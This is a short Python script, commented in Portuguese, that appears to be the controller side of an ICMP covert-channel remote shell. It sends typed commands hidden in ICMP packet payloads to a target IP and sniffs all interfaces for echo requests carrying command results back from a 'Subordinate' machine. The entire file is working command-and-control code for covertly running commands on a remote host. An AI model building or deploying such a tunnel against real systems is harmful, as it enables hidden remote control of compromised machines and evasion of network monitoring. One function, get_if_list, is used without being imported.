#!/usr/bin/python
import sys
import subprocess
import threading
from scapy.all import sr1, IP, ICMP, sniff

if len(sys.argv) < 2: # Valida se foi informado o IP no início do script
  print('Use: %s <IP>' % sys.argv[0]) 
  exit()

def handle_icmp(pkt):
  if 'ICMP' in pkt and 'Raw' in pkt:
    payload = pkt["Raw"].load.decode('utf-8')
    if payload.startswith('command_result=') and pkt['ICMP'].type == 8:  # Echo request
      print(payload.replace('command_result=', '')) # exibe no console o resuldado do comando executado no Subordinate

class InterfaceSnifferThread (threading.Thread):
   def __init__(self, interface_name):
      threading.Thread.__init__(self)
      self.interface_name = interface_name
   def run(self):
      sniff(iface=self.interface_name, prn=handle_icmp)

# Os sniffers devem rodar em threads separadas para não travar o console
# como o computados pode ter mais interfaces ativas cada interface fica em uma thread
# TODO: Não está sendo validado as interfaces ativas então o script pode quebrar
thread_sniffers = [] 
for interface_name in get_if_list(): # Obter lista de interfaces
  thread_sniffers.append(InterfaceSnifferThread(interface_name))

# Inicia os sniffers
for sniffer in thread_sniffers:
  sniffer.start() 

try:
  while True:
    command = 'command=' + str(input()) # Recebe o comando do prompt
    print(command)
    sr1(IP(dst=sys.argv[1])/ICMP()/command) # Envia icmp com o comando no payload para o ip informado
except KeyboardInterrupt:
  print('Exiting...')
  for sniffer in thread_sniffers:
    sniffer.join() # Finaliza as threads para o script não ficar pendurado